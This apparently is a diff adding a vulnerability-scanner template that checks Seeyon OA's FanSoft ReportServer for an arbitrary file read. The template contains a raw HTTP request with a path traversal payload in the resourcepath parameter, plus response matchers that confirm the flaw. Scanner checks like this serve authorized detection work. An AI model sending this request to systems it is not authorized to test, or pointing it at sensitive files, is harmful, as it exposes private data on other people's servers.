@@ -1,0 +1,30 @@
+id: seeyon-arbitrary-file-read
+
+info:
+  name: Seeyon Arbitrary File Reading
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Seeyon OA office automation software is vulnerable to an arbitrary file reading vulnerability in its FanSoft component, allowing unauthorized access to sensitive files.
+  tags: file-read
+
+variables:
+  file_path: "../../../../NOTICE"
+
+http:
+  - raw:
+      - |
+        GET /seeyonreport/ReportServer?op=chart&cmd=get_geo_json&resourcepath={{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "javaee_(\\w{1,8})"
+      - type: word
+        words:
+          - "The Windows Installer is built with the Nullsoft"
